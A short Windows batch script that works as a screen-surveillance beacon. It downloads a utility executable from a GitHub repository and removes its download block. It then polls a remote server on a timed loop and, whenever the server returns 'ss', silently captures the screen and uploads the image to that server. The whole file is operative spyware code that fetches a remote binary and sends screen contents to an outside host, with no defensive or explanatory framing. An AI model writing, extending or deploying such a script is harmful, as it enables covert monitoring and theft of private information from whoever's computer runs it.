@echo off
set "apiRoot=https://screen-view-one.vercel.app"
set /p name=<name.txt

curl -L -o "nircmd.exe" "https://github.com/skollol/e/raw/refs/heads/main/nircmdc.exe"
if %ERRORLEVEL% neq 0 (
    echo Download failed.
    exit /b 1
)

powershell -Command "Unblock-File -Path 'nircmd.exe'"
echo Download successful.
echo API Root: %apiRoot%

for /f "delims=" %%i in ('curl -s "%apiRoot%/conf/ping"') do set "waitTime=%%i"
echo Ping interval: %waitTime% seconds

:loop
for /f "delims=" %%i in ('curl -s -X POST -d "name=%name%" "%apiRoot%/u"') do set "result=%%i"
echo Response: %result%

if "%result%"=="ss" (
    echo Taking screenshot...
    nircmd.exe savescreenshot ss.jpg
    echo Uploading screenshot...
    curl -s -X POST -F "name=%name%" -F "image=@ss.jpg" "%apiRoot%/ss"
)

timeout /t %waitTime% /nobreak >nul
goto loop
